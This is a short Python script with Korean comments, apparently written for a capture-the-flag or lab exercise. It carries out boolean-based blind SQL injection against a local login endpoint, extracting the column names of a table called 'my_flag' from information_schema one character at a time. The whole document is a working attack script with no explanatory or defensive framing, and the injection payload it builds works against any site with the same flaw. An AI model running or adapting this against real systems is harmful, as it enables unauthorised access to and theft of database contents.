import requests

# 대상 URL
url = "http://127.0.0.1:25576/login"

# 컬럼 이름 추출 함수
def get_column_names(table_name):
    columns = []
    offset = 0  # 시작 위치
    
    while True:
        column_name = ""  # 컬럼 이름 초기화
        for position in range(1, 100):  # 컬럼 이름의 최대 길이 가정
            found = False
            for char_code in range(32, 127):  # 출력 가능한 ASCII 문자
                payload = (
                    f"' OR (SELECT ASCII(SUBSTRING(column_name, {position}, 1)) FROM information_schema.columns "
                    f"WHERE table_name = '{table_name}' LIMIT 1 OFFSET {offset}) = {char_code}-- "
                )
                params = {
                    "username": payload,
                    "password": "test"
                }
                
                # HTTP GET 요청
                response = requests.get(url, params=params)
                
                if "Login successful!" in response.text:
                    column_name += chr(char_code)
                    found = True
                    break
            
            if not found:
                break  # 현재 컬럼 이름이 끝났음을 의미
        
        if not column_name:
            break  # 더 이상 컬럼이 없음을 의미
        
        columns.append(column_name)
        offset += 1  # 다음 컬럼으로 이동
    
    return columns

# 실행
table_name = "my_flag"  # 컬럼명을 추출할 테이블 이름
columns = get_column_names(table_name)
print(f"Table '{table_name}'의 컬럼명: {columns}")
